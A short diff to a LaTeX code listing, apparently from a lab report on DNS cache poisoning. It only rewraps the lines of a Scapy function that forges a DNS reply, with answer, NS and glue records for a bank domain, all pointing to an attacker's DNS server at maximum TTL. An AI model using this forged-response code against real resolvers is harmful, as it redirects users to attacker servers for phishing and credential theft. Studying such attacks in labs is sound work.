@@ -81,9 +81,12 @@ def forged_ns_response(id, target_domain, known_ns_ip):
         qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
         # DNS Resource Record
         an=DNSRR(rrname=target_domain, type='A', rdata=attacker_dns_ip, ttl=MAX_TTL),
-        ns=DNSRR(rrname=victim_base_domain, type='NS', rdata="forged-ns.bank.com", ttl=MAX_TTL),
-        ar=DNSRR(rrname="forged-ns.bank.com", type='A', rdata=attacker_dns_ip, ttl=MAX_TTL)
+        ns=DNSRR(rrname=victim_base_domain, type='NS', rdata="forged-ns.bank.com",
+        	ttl=MAX_TTL),
+        ar=DNSRR(rrname="forged-ns.bank.com", type='A', rdata=attacker_dns_ip,
+        	ttl=MAX_TTL)
     )
+    
     return response
 \end{lstlisting}
 \end{center}
